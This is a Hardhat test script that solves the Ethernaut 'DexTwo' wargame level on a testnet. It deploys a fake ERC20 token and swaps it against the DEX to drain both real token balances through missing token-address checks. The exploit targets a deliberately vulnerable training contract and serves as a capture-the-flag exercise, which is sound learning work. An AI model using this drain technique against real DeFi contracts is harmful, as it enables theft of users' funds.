// npx hardhat compile
// npx hardhat test ./test/23_dex_two.js --network rinkeby

const { expect } = require("chai");
const { ethers } = require("hardhat");
const ETHERNAUT_LEVELS = require("../ethernaut-levels-config.js")
const Utils = require("./Utils.js");
const { parseEther } = require("ethers/lib/utils");

let levelContract;
const INTERFACE_CONTRACT = "DexTwo";

before(async () => {
    levelContract = await Utils.getLevelContract(ETHERNAUT_LEVELS._23_dex_two, INTERFACE_CONTRACT);
});

it("solves the level", async function () {
    let token1 = await ethers.getContractAt(
        "IERC20",
        await levelContract.token1()
    );
    let token2 = await ethers.getContractAt(
        "IERC20",
        await levelContract.token2()
    );

    let attackFactory = await ethers.getContractFactory("DexTwoAttack");
    let attack = await attackFactory.deploy("Dogecoin", "DOGE", parseEther("1"));

    await levelContract.approve(levelContract.address, parseEther("1"));
    await attack.approve(levelContract.address, parseEther("1"));

    let DEXToken1Balance = await token1.balanceOf(levelContract.address);
    //console.log(`DEX token1 balance ${DEXToken1Balance}`);
    const accounts = await hre.ethers.getSigners();
    await attack.transferFrom(accounts[0].address, levelContract.address, DEXToken1Balance)
    await levelContract.swap(attack.address, token1.address, DEXToken1Balance);
    //DEXToken1Balance = await token1.balanceOf(levelContract.address);
    //console.log(`DEX token1 balance ${DEXToken1Balance}`);
    let DEXFakeTokenBalance = await attack.balanceOf(levelContract.address);
    await levelContract.swap(attack.address, token2.address, DEXFakeTokenBalance);
});

after(async () => {
    expect(await Utils.submitLevel(levelContract.address), "level was not completed").to.be.true;
});